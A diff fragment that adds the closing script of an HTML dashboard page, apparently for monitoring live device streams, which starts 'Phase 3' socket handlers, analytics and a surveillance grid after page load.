+                        overlay.textContent = `${data.deviceName} - Live (${data.quality})`;
+                    }
+                }
+            });
+        }
+
+        // Initialize Phase 3 features
+        function initPhase3Features() {
+            initPhase3SocketHandlers();
+            startAnalytics();
+            updateSurveillanceGrid();
+            
+            addLog('🚀 Phase 3 Advanced Features initialized', 'success');
+            addLog('📡 Live streaming, analytics, and formations ready', 'info');
+        }
+
+        // Update the main initialization to include Phase 3
+        const originalOnLoad = window.onload;
+        window.onload = function() {
+            if (originalOnLoad) originalOnLoad();
+            
+            // Initialize Phase 3 features after a short delay
+            setTimeout(() => {
+                initPhase3Features();
+            }, 3000);
+        };
+    </script>
+</body>
+</html>
